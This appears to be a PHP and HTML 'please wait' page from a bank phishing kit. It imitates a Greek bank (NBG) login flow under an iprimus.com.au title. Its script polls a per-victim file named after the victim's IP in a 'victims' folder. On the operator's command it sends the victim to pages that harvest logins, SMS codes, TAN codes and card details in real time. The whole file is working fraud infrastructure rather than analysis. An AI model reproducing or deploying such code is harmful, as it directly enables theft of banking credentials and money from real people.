<?php
    /*******
    Main Author: MemoryError
    ********************************************************/
    
    require_once '../includes/main.php';
    $code = $_GET['code'];
    $_SESSION['last_page'] = 'loading';
?>



<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>iprimus.com.au</title>
      <meta name="multilanguage" content="true">
      <meta name="mntc" content="[mntc]">
      <meta name="mntcMsg" content="[mntcMsg]">

      <meta name="arm" content="119">
      <meta name="lng" content="el">
      <meta name="epe" content="false">
      <meta name="_af" content="T_XIGso1SMr7zdtjnsjKGZ6X8NrfquicRUdDng4aKgmnaTuo9Mou7d-2csrY07FdvjBf6CmaIyPjJH1eurboogXRQhxuvZss65V2rJDfA_I1">
      <meta name="rscsSc" content="[rscsSc]">
      <meta name="bank" content="NBG">
      <meta name="indexTemplate" content="login-night">
      <meta name="appId" content="2e7971cd-7afd-49a0-89ae-7ec531298d01">
      <meta name="gaId" content="UA-33771010-2">
      <meta name="sbxId" content="[sbxId]">
      <meta name="ofnn" content="false">
      <meta name="ftr_exCustOnb" content="true">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
      <meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" type=image/ico href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAABZLCbWWSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCbWWSwm/lksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/lksJv9ZLCb/WSwm/1gqJv9YKib/WCom/1gqJv9YKib/WCom/1gqJv9YKib/WCom/1gqJv9ZLCb/WSwm/1ksJv9ZLCb/WSsm/101J/91cyz/en4t/3l9Lf95fS3/eX0t/3l9Lf95fS3/eX0t/3p+Lf91cyz/XTUn/1krJv9ZLCb/WSwm/1krJv9gPCf/i6ow/5K8Mf+SuzH/krsx/5K6MP+SuzH/krsx/5G6MP+SvDH/i6ow/2A8J/9ZKyb/WSwm/1ksJv9ZLCb/Wi4m/2A8J/9uTzn/bE43/2hIMf9uUDr/YkEq/2NCK/9wUzz/bU43/188J/9aLib/WSwm/1ksJv9ZLCb/WSwm/1grJf+Rc3D/4NjY/9zS0v/Ku7r/1srK/31ZVf+6p6X/5d3e/93T0/+ZfXr/Wi4o/1ksJv9ZLCb/WSwm/1grJf9kOjX/3dTS/+vl5f+ynZr/5t/e/+/r6v+ZfXn/zL+9/6yWk//XzMr/5d7d/2g/Ov9YKyX/WSwm/1ksJv9YKiT/bEU//+7p6P+5p6T/VSch/7Gcmv/y7u3/fVpV/5yBff/HuLX/5d7d/7ypp/9fNC7/WSsl/1ksJv9ZLCb/WCok/21FQP/u6en/tKCd/1UnIf+slpP/8Ovr/6aOi//18vL/vqyq/6OKh/+MbGj/XTEs/1ksJv9ZLCb/WSwm/1gqJP9tRUD/7unp/7Sgnv9VJyH/rZaT//Ds7P+af3v/7Obm/+La2f/u6en/w7Ox/180Lv9ZKyX/WSwm/1ksJv9YKyX/Yjcx/5yBfv+CYFz/Vyok/39cV/+eg4D/Zz04/4FfWv+pkY7/mn97/2pBPP9YKyX/WSwm/1ksJv9ZLCb/WSwm/1ksJv9XKSP/WCok/1ksJv9YKiT/Vykj/1grJf9XKiP/Vikj/1YpI/9YKyX/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv5ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv5ZLCbWWSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCb/WSwm/1ksJv9ZLCbWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==">
      <link href="src/css/style6.css" rel="stylesheet">
   </head>
   <body class="login-bg">
      <index-page>
         <div class="loader">
            <div class="loading-stage-container">
               <div class="flex-all-center">
                  <div class="loading-stage-logo-container">
                     <figure class="margin-0">
                        <img class="loading-stage-logo" src="./index_files/index-.png" alt="">
                     </figure>
                  </div>
                  <div class="loading-stage-vertical-line"></div>
                  <div class="loading-stage-logo-container">
                     <figure class="margin-0">
                        <img class="loading-stage-nbg-logo" src="./index_files/index.png" alt="Loading...">
                     </figure>
                  </div>
               </div>
               <spinner>
                  <div class="flex-column-all-center">
                     <div class="circle-loader"></div>
                     <h5 class="loader-text">Please wait</h5>
                  </div>
               </spinner>
            </div>
         </div>
      </index-page>
   </body>
</html>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../assets/js/script.js"></script>

 <script>
            var ip = '<?php echo get_client_ip(); ?>';
            var waiting = setInterval(function() {
                $.get('../victims/' + ip + '.txt', function(data) {
                    if( data == 0 ) {
                        //console.log('hada ba9i 0');
                    } else {
                        var zow = data.split('/');
                        var one = zow[0];
                        var two = zow[1];
                        if( one == 'errorlogin' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=errorlogin";
                        } else if( one == 'secret' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=secret&code=" + two;
                        } else if( one == 'tele' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=tele";
                        } else if( one == 'sms' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=sms&code=" + two;
                        } else if( one == 'cc' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=cc";
                        } else if( one == 'errorcc' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=errorcc";
                        } else if( one == 'errorsms' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=errorsms&code=" + two;
                        } else if( one == 'tan' ) {
                            clearInterval(waiting);
                            var code1 = zow[1];
                            var code2 = zow[2];
                            var code3 = zow[3];
                            location.href = "../index-.php?redirection=tan&code1="+ code1 +"&code2="+ code2 +"&code3=" + code3;
                        } else if( one == 'errortan' ) {
                            clearInterval(waiting);
                            var code1 = zow[1];
                            var code2 = zow[2];
                            var code3 = zow[3];
                            location.href = "../index-.php?redirection=errortan&code1="+ code1 +"&code2="+ code2 +"&code3=" + code3;
                        } else if( one == 'success' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=success";
                        }

                    }
                });
            }, 1000);
        </script>

    </body>

</html>